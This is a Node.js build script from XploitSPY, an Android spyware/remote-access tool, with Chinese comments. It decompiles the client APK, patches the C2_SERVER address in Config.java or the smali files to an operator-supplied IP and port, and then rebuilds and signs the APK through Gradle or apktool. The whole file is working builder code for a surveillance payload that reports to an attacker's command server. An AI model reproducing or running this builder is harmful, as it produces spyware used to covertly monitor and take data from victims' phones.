const
    cp = require('child_process'),
    fs = require('fs'),
    path = require('path'),
    CONST = require('./const');

/**
 * 检查Java是否已安装
 */
function checkJava(callback) {
    let spawn = cp.spawn('java', ['-version']);
    spawn.on('error', (err) => callback("Java未安装", null));
    spawn.stderr.on('data', (data) => {
        spawn.removeAllListeners();
        spawn.stderr.removeAllListeners();
        return callback(null, "Java已安装");
    });
}

/**
 * 获取Android SDK路径
 * 支持多种常见安装位置
 */
function getAndroidSdkPath() {
    // 首先检查环境变量
    if (process.env.ANDROID_HOME) {
        return process.env.ANDROID_HOME;
    }
    if (process.env.ANDROID_SDK) {
        return process.env.ANDROID_SDK;
    }
    
    // 常见Linux安装路径
    const commonPaths = [
        '/opt/android-sdk',
        '/usr/local/android-sdk',
        '/home/android-sdk',
        path.join(require('os').homedir(), 'Android/Sdk'),
        path.join(require('os').homedir(), 'android-sdk'),
        '/var/lib/android-sdk'
    ];
    
    for (const sdkPath of commonPaths) {
        if (fs.existsSync(sdkPath)) {
            return sdkPath;
        }
    }
    
    return null;
}

/**
 * 检查是否可以使用ApkTool方案（无需Android SDK）
 */
function canUseApkTool() {
    return fs.existsSync(CONST.apkTool);
}

/**
 * 重新反编译APK（确保decompiled目录是最新的）
 * @param {function} callback - 回调函数
 */
function recompileAPK(callback) {
    console.log('[DEBUG] 开始重新反编译APK...');
    console.log('[DEBUG] smaliPath:', CONST.smaliPath);
    
    // 删除旧的decompiled目录
    if (fs.existsSync(CONST.smaliPath)) {
        console.log('[DEBUG] 删除旧的decompiled目录...');
        try {
            fs.rmSync(CONST.smaliPath, { recursive: true, force: true });
            console.log('[DEBUG] 旧目录删除成功');
        } catch (e) {
            console.log('[DEBUG] 删除旧目录警告:', e.message);
        }
    }
    
    // 找到源APK文件
    const sourceApk = path.join(__dirname, '../app/factory/app-release.apk');
    console.log('[DEBUG] 源APK路径:', sourceApk);
    console.log('[DEBUG] 源APK存在:', fs.existsSync(sourceApk));
    
    if (!fs.existsSync(sourceApk)) {
        return callback('未找到源APK文件: ' + sourceApk);
    }
    
    // 执行反编译
    const apktoolCmd = `java -jar "${CONST.apkTool}" d -f -o "${CONST.smaliPath}" "${sourceApk}"`;
    console.log('[DEBUG] 执行命令:', apktoolCmd);
    
    cp.exec(apktoolCmd, { timeout: 120000 }, (error, stdout, stderr) => {
        if (error) {
            console.log('[DEBUG] 反编译输出:', stdout);
            console.log('[DEBUG] 反编译错误:', stderr);
            return callback('反编译APK失败: ' + error.message);
        }
        
        console.log('[DEBUG] APK反编译成功');
        console.log('[DEBUG] 新decompiled目录存在:', fs.existsSync(CONST.smaliPath));
        
        // 更新apktool.yml中的SDK版本信息
        updateApkToolYml((err) => {
            if (err) console.log('[DEBUG] 更新apktool.yml警告:', err);
            return callback(false);
        });
    });
}

/**
 * 更新apktool.yml中的SDK版本信息
 * @param {function} callback - 回调函数
 */
function updateApkToolYml(callback) {
    const ymlPath = path.join(CONST.smaliPath, 'apktool.yml');
    
    if (!fs.existsSync(ymlPath)) {
        return callback('apktool.yml不存在');
    }
    
    try {
        let content = fs.readFileSync(ymlPath, 'utf8');
        
        // 更新targetSdkVersion到34
        content = content.replace(/targetSdkVersion: '\d+'/, "targetSdkVersion: '34'");
        // 更新minSdkVersion到21（保持兼容性）
        content = content.replace(/minSdkVersion: '\d+'/, "minSdkVersion: '21'");
        // 更新versionCode
        content = content.replace(/versionCode: '\d+'/, "versionCode: '3'");
        content = content.replace(/versionName: "[^"]*"/, 'versionName: "3.0"');
        
        fs.writeFileSync(ymlPath, content, 'utf8');
        console.log('[DEBUG] 已更新apktool.yml SDK版本为34');
        return callback(false);
    } catch (e) {
        return callback('更新apktool.yml失败: ' + e.message);
    }
}

/**
 * 递归查找包含服务器地址的smali文件
 * @param {string} dir - 搜索目录
 * @returns {string|null} - 找到的文件路径或null
 */
function findSmaliWithServerUrl(dir) {
    console.log('[DEBUG] 搜索目录:', dir);
    
    if (!fs.existsSync(dir)) {
        console.log('[DEBUG] 目录不存在:', dir);
        return null;
    }
    
    const files = fs.readdirSync(dir);
    console.log('[DEBUG] 目录中有', files.length, '个项目');
    
    for (const file of files) {
        const fullPath = path.join(dir, file);
        const stat = fs.statSync(fullPath);
        
        if (stat.isDirectory()) {
            const result = findSmaliWithServerUrl(fullPath);
            if (result) return result;
        } else if (file.endsWith('.smali')) {
            try {
                const content = fs.readFileSync(fullPath, 'utf8');
                // 查找包含http://模式的行（更精确的匹配）
                if (/const-string v\d+, "http:\/\/[^"]*"/.test(content) || 
                    /"http:\/\/[^"]*"/.test(content)) {
                    console.log('[DEBUG] 找到包含URL的smali文件:', fullPath);
                    return fullPath;
                }
            } catch (e) {
                console.log('[DEBUG] 读取文件失败:', fullPath, e.message);
            }
        }
    }
    
    console.log('[DEBUG] 在目录中未找到:', dir);
    return null;
}

/**
 * 使用ApkTool修改smali文件中的服务器地址（无需Android SDK）
 * @param {string} URI - 服务器地址
 * @param {string} PORT - 服务器端口
 * @param {function} callback - 回调函数
 */
function patchApkTool(URI, PORT, callback) {
    // 首先更新apktool.yml中的SDK版本（确保targetSdk为34）
    updateApkToolYml((err) => {
        if (err) console.log('[DEBUG] 更新apktool.yml警告:', err);
    });
    
    // 首先尝试已知位置
    const smaliBasePath = path.join(CONST.smaliPath, 'smali');
    const configSmaliPath = path.join(smaliBasePath, 'com/remote/app/Config.smali');
    const iosocketSmaliPath = path.join(smaliBasePath, 'com/remote/app/IOSocket.smali');
    
    let targetFile = null;
    // 默认匹配 const-string 模式，这是最常见且安全的模式
    let patchPattern = /const-string v\d+, "http:\/\/[^"]*"/;
    let replacementMode = 'const-string';
    
    // 检测使用哪个文件
    if (fs.existsSync(configSmaliPath)) {
        targetFile = configSmaliPath;
        patchPattern = /const-string v\d+, "http:\/\/[^"]*"/;
        replacementMode = 'const-string';
    } else if (fs.existsSync(iosocketSmaliPath)) {
        targetFile = iosocketSmaliPath;
        // 旧版可能没有const-string，使用简单模式
        patchPattern = /http:\/\/[^"]+/;
        replacementMode = 'simple';
    } else {
        // 自动搜索任何包含http://的smali文件
        console.log('正在搜索包含服务器地址的smali文件...');
        targetFile = findSmaliWithServerUrl(smaliBasePath);
        
        if (!targetFile) {
            // 如果找不到，可能是decompiled目录损坏或不完整
            // 重新反编译APK
            return recompileAPK((err) => {
                if (err) return callback(err);
                
                // 重新搜索
                console.log('重新搜索smali文件...');
                targetFile = findSmaliWithServerUrl(smaliBasePath);
                
                if (!targetFile) {
                    return callback('重新反编译后仍未找到包含服务器地址的smali文件');
                }
                
                // 继续处理
                const content = fs.readFileSync(targetFile, 'utf8');
                if (/const-string v\d+, "http:\/\/[^"]*"/.test(content)) {
                    patchPattern = /const-string v\d+, "http:\/\/[^"]*"/;
                    replacementMode = 'const-string';
                }
                
                console.log('找到目标文件:', targetFile);
                
                fs.readFile(targetFile, 'utf8', function (err, data) {
                    if (err) return callback('读取smali文件失败: ' + err.message);
                    
                    const serverUrl = `http://${URI}:${PORT}`;
                    
                    let result;
                    if (replacementMode === 'const-string') {
                        result = data.replace(patchPattern, `const-string v0, "${serverUrl}"`);
                    } else {
                        result = data.replace(patchPattern, serverUrl);
                    }
                    
                    if (result === data) {
                        return callback('未能在smali文件中找到服务器地址模式');
                    }
                    
                    fs.writeFile(targetFile, result, 'utf8', function (err) {
                        if (err) return callback('写入smali文件失败: ' + err.message);
                        console.log('已修补smali文件:', targetFile);
                        return callback(false);
                    });
                });
            });
        }
        
        // 检查是否是const-string模式
        const content = fs.readFileSync(targetFile, 'utf8');
        if (/const-string v\d+, "http:\/\/[^"]*"/.test(content)) {
            patchPattern = /const-string v\d+, "http:\/\/[^"]*"/;
            replacementMode = 'const-string';
        } else if (/"http:\/\/[^"]+"/.test(content)) {
            // 其他带引号的URL模式
            patchPattern = /"http:\/\/[^"]+"/;
            replacementMode = 'quoted';
        } else {
            // 无引号的简单模式（不推荐，可能出错）
            patchPattern = /http:\/\/[^\s]+/;
            replacementMode = 'simple';
        }
    }
    
    console.log('[DEBUG] 找到目标文件:', targetFile);
    console.log('[DEBUG] 使用模式:', replacementMode);
    
    fs.readFile(targetFile, 'utf8', function (err, data) {
        if (err) return callback('读取smali文件失败: ' + err.message);
        
        const serverUrl = `http://${URI}:${PORT}`;
        
        let result = data;
        const serverUrlPattern = /http:\/\/[^"\s]+/;
        
        if (replacementMode === 'const-string') {
            // 匹配完整的 const-string 行，替换其中的 URL
            const fullPattern = /const-string v\d+, "http:\/\/[^"]+"/;
            result = data.replace(fullPattern, (match) => {
                // 提取 URL 部分（不包括前后的引号和前缀）
                const urlMatch = match.match(/http:\/\/[^"]+/);
                if (!urlMatch) return match;
                
                const oldUrl = urlMatch[0];
                const queryIndex = oldUrl.indexOf('?');
                const query = queryIndex >= 0 ? oldUrl.substring(queryIndex) : '';
                
                // 获取原始寄存器号
                const regMatch = match.match(/const-string (v\d+),/);
                const register = regMatch ? regMatch[1] : 'v2';
                
                return `const-string ${register}, "${serverUrl}${query}"`;
            });
        } else if (replacementMode === 'quoted') {
            // 带引号的模式
            result = data.replace(/"http:\/\/[^"]+"/, (match) => {
                const urlMatch = match.match(/http:\/\/[^"]+/);
                if (!urlMatch) return match;
                
                const oldUrl = urlMatch[0];
                const queryIndex = oldUrl.indexOf('?');
                const query = queryIndex >= 0 ? oldUrl.substring(queryIndex) : '';
                
                return `"${serverUrl}${query}"`;
            });
        } else {
            // 旧版模式：直接替换URL
            result = data.replace(serverUrlPattern, serverUrl);
        }
        
        // 检查是否真的替换了
        if (result === data) {
            console.log('[DEBUG] 修补失败：内容未改变');
            console.log('[DEBUG] 原始内容前200字符:', data.substring(0, 200));
            return callback('未能在smali文件中找到服务器地址模式');
        }
        
        fs.writeFile(targetFile, result, 'utf8', function (err) {
            if (err) return callback('写入smali文件失败: ' + err.message);
            console.log('已修补smali文件:', targetFile);
            return callback(false);
        });
    });
}

/**
 * 使用ApkTool构建APK（无需Android SDK）
 * @param {function} cb - 回调函数
 */
function buildWithApkTool(cb) {
    checkJava(function (err) {
        if (err) return cb(err);
        
        console.log('使用ApkTool方案构建（无需Android SDK）...');
        
        // 执行ApkTool构建
        cp.exec(CONST.apktoolBuildCommand, { timeout: 300000 }, (error, stdout, stderr) => {
            if (error) {
                console.log('ApkTool构建输出:', stdout);
                console.log('ApkTool构建错误:', stderr);
                return cb('ApkTool构建失败: ' + error.message);
            }
            
            console.log('ApkTool构建成功');
            
            // 检查APK是否存在
            if (!fs.existsSync(CONST.apkBuildPath)) {
                return cb('未找到构建的APK文件: ' + CONST.apkBuildPath);
            }
            
            // 签名APK
            cp.exec(CONST.apktoolSignCommand, (signError, signStdout, signStderr) => {
                if (signError) {
                    console.log('签名输出:', signStdout);
                    console.log('签名错误:', signStderr);
                    return cb('APK签名失败: ' + signError.message);
                }
                
                console.log('APK签名成功');
                console.log('签名输出:', signStdout);
                
                // 验证签名后的APK文件
                const signedApk = path.join(CONST.apkOutputPath, 'build-aligned-signed.apk');
                if (!fs.existsSync(signedApk)) {
                    // 尝试其他可能的文件名
                    const alternativeApk = path.join(CONST.apkOutputPath, 'app-release-aligned-signed.apk');
                    if (fs.existsSync(alternativeApk)) {
                        fs.renameSync(alternativeApk, signedApk);
                    }
                }
                
                if (fs.existsSync(signedApk)) {
                    const stats = fs.statSync(signedApk);
                    console.log('签名后APK大小:', stats.size, '字节');
                    if (stats.size < 10000) {
                        return cb('APK文件过小，可能签名失败');
                    }
                }
                
                return cb(false);
            });
        });
    });
}

/**
 * 设置local.properties中的SDK路径（Gradle方案）
 */
function setupLocalProperties(cb) {
    const sdkPath = getAndroidSdkPath();
    if (!sdkPath) {
        return cb('未找到Android SDK');
    }
    
    const localPropertiesPath = path.join(CONST.clientPath, 'local.properties');
    const content = `## 此文件由XploitSPY自动生成，请勿手动修改
sdk.dir=${sdkPath}
`;
    
    fs.writeFile(localPropertiesPath, content, 'utf8', (err) => {
        if (err) return cb('写入local.properties失败: ' + err.message);
        console.log('已设置Android SDK路径:', sdkPath);
        return cb(false);
    });
}

/**
 * 修改Config.java中的C2服务器地址（Gradle方案）
 * @param {string} URI - 服务器地址
 * @param {string} PORT - 服务器端口
 * @param {function} cb - 回调函数
 */
function patchConfig(URI, PORT, cb) {
    fs.readFile(CONST.configFilePath, 'utf8', function (err, data) {
        if (err) return cb('读取Config.java失败: ' + err.message);
        
        const serverUrl = `http://${URI}:${PORT}`;
        
        // 替换C2_SERVER的值
        const pattern = /public static String C2_SERVER\s*=\s*"[^"]*";/;
        const replacement = `public static String C2_SERVER = "${serverUrl}";`;
        
        if (!pattern.test(data)) {
            return cb('Config.java中未找到C2_SERVER定义');
        }
        
        const result = data.replace(pattern, replacement);
        
        fs.writeFile(CONST.configFilePath, result, 'utf8', function (err) {
            if (err) return cb('写入Config.java失败: ' + err.message);
            return cb(false);
        });
    });
}

/**
 * 使用Gradle构建APK（需要Android SDK）
 * @param {function} cb - 回调函数
 */
function buildWithGradle(cb) {
    checkJava(function (err) {
        if (err) return cb(err);
        
        const sdkPath = getAndroidSdkPath();
        if (!sdkPath) {
            return cb('未找到Android SDK，无法使用Gradle方案');
        }
        
        console.log('使用Gradle方案构建（需要Android SDK）...');
        
        const options = {
            cwd: CONST.clientPath,
            timeout: 300000,
            env: {
                ...process.env,
                ANDROID_HOME: sdkPath,
                ANDROID_SDK: sdkPath
            }
        };
        
        cp.exec(CONST.gradleBuildCommand, options, (error, stdout, stderr) => {
            if (error) {
                console.log('Gradle构建输出:', stdout);
                console.log('Gradle构建错误:', stderr);
                return cb('Gradle构建失败: ' + error.message);
            }
            
            console.log('Gradle构建成功');
            
            if (!fs.existsSync(CONST.apkUnsignedPath)) {
                return cb('未找到构建的APK文件: ' + CONST.apkUnsignedPath);
            }
            
            cp.exec(CONST.gradleSignCommand, (signError, signStdout, signStderr) => {
                if (signError) {
                    console.log('签名输出:', signStdout);
                    console.log('签名错误:', signStderr);
                    return cb('APK签名失败: ' + signError.message);
                }
                
                // 重命名签名后的APK
                const signedApkPath = path.join(CONST.apkOutputPath, 'app-release-aligned-signed.apk');
                if (fs.existsSync(signedApkPath)) {
                    fs.renameSync(signedApkPath, CONST.apkSignedBuildPath);
                }
                
                return cb(false);
            });
        });
    });
}

/**
 * 智能构建APK - 自动选择最佳方案
 * @param {string} URI - 服务器地址
 * @param {string} PORT - 服务器端口
 * @param {function} cb - 回调函数
 */
function buildAPK(URI, PORT, cb) {
    // 判断使用哪种方案
    const hasAndroidSdk = getAndroidSdkPath() !== null;
    const hasApkTool = canUseApkTool();
    
    console.log('构建方案检测:');
    console.log('  - Android SDK:', hasAndroidSdk ? '存在' : '不存在');
    console.log('  - ApkTool:', hasApkTool ? '存在' : '不存在');
    
    if (hasAndroidSdk) {
        // 优先使用Gradle方案（更现代，支持Android 14）
        console.log('选择: Gradle方案（推荐，支持Android 14）');
        setupLocalProperties((err) => {
            if (err) {
                // Gradle设置失败，回退到ApkTool
                if (hasApkTool) {
                    console.log('Gradle设置失败，回退到ApkTool方案...');
                    return buildApkToolFull(URI, PORT, cb);
                }
                return cb(err);
            }
            
            patchConfig(URI, PORT, (err) => {
                if (err) {
                    if (hasApkTool) {
                        console.log('Config.java修补失败，回退到ApkTool方案...');
                        return buildApkToolFull(URI, PORT, cb);
                    }
                    return cb(err);
                }
                
                buildWithGradle(cb);
            });
        });
    } else if (hasApkTool) {
        // 使用ApkTool方案
        console.log('选择: ApkTool方案（无需Android SDK）');
        buildApkToolFull(URI, PORT, cb);
    } else {
        return cb('未找到可用的构建方案。请安装Android SDK（用于Gradle方案）或确保apktool.jar和decompiled目录存在（用于ApkTool方案）');
    }
}

/**
 * 完整的ApkTool构建流程
 */
function buildApkToolFull(URI, PORT, cb) {
    patchApkTool(URI, PORT, (err) => {
        if (err) return cb(err);
        buildWithApkTool(cb);
    });
}

/**
 * 清理构建缓存
 */
function cleanBuild(cb) {
    // 清理Gradle
    if (fs.existsSync(CONST.gradlePath)) {
        const options = {
            cwd: CONST.clientPath,
            timeout: 60000
        };
        cp.exec(`${CONST.gradlePath} clean`, options, (error) => {
            if (error) console.log('Gradle清理警告:', error.message);
        });
    }
    
    // 清理ApkTool输出
    if (fs.existsSync(CONST.apkBuildPath)) {
        fs.unlinkSync(CONST.apkBuildPath);
    }
    
    return cb(false);
}

module.exports = {
    buildAPK,
    patchConfig,
    patchApkTool,
    cleanBuild,
    getAndroidSdkPath,
    canUseApkTool,
    // 保持向后兼容
    patchAPK: patchConfig,
    buildAPKFull: buildAPK
};
